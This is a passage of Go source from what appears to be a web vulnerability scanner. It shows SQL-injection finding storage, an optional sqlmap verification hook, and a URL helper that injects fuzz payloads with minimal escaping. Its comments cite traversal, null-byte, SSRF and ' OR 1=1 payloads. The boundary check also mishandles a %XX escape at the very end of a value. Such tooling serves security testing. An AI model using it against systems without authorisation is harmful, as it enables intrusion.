	// Also register a unified candidate so the VerificationOrchestrator (e.g. the
	// sqlmap adapter, when enabled) can attempt to PROVE it. Non-destructive: the
	// candidate row is metadata; the sqlmap run is opt-in via cfg.EnableSQLmap.
	StoreCandidate(context.Background(), s.db, VulnerabilityCandidate{
		TargetID: targetID, Type: "sqli", Subtype: kind, URL: rawURL, Parameter: param,
		Location: "query", Payload: kind, DetectionSource: "internal", DetectionMethod: kind,
		Severity: severity, Confidence: conf, Status: CandDetected, Evidence: evidence,
	})
}

func (s *SQLiScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "sqli", "url": rawURL, "parameter": param,
		})
	}
}

// injectParam sets param=value on rawURL (URL-encoded).
// injectParam replaces (or adds) param=value in rawURL's query string.
//
// The injected value is placed with MINIMAL escaping (queryEscapeMinimal) so a
// payload's own encoding is preserved verbatim: pre-encoded filter-bypass
// payloads (`..%2f`, `%c0%ae`, `%00`) and heavily %-encoded gopher/SSRF payloads
// survive intact instead of being double-encoded (`%2f`→`%252f`) into
// uselessness — the previous q.Encode() path silently neutered every one of
// them. Raw payloads (SQLi `' OR 1=1`, spaces, quotes) still work because the
// only structural characters that would break the query/request are escaped
// (space, &, #, +, control bytes, and a lone % that isn't a valid %XX escape).
// The other, non-injected params keep normal encoding.
func injectParam(rawURL, param, value string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	const placeholder = "RECONINJPLACEHOLDER0"
	q := parsed.Query()
	q.Set(param, placeholder)
	enc := q.Encode()
	parsed.RawQuery = strings.Replace(enc, placeholder, queryEscapeMinimal(value), 1)
	return parsed.String()
}

// isHexDigit reports whether b is an ASCII hex digit (for detecting valid %XX).
func isHexDigit(b byte) bool {
	return (b >= '0' && b <= '9') || (b >= 'a' && b <= 'f') || (b >= 'A' && b <= 'F')
}

// queryEscapeMinimal escapes only the characters that would break the URL's
// query structure or the HTTP request line, leaving everything else (including
// already-valid %XX escapes, '/', '.', quotes, ':') verbatim so a fuzz payload's
// intended on-the-wire form is what the server actually receives.
func queryEscapeMinimal(v string) string {
	var b strings.Builder
	b.Grow(len(v) + 8)
	for i := 0; i < len(v); i++ {
		c := v[i]
		switch {
		case c == '%':
			// Preserve a valid %XX escape as-is; escape a stray '%'.
			if i+2 < len(v) && isHexDigit(v[i+1]) && isHexDigit(v[i+2]) {
				b.WriteByte(c)
			} else {
				b.WriteString("%25")
			}
		case c == ' ':
			b.WriteString("%20")
		case c == '+':
			b.WriteString("%2B")
		case c == '&':
			b.WriteString("%26")
		case c == '#':
			b.WriteString("%23")
		case c < 0x20 || c > 0x7E:
			fmt.Fprintf(&b, "%%%02X", c)
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}
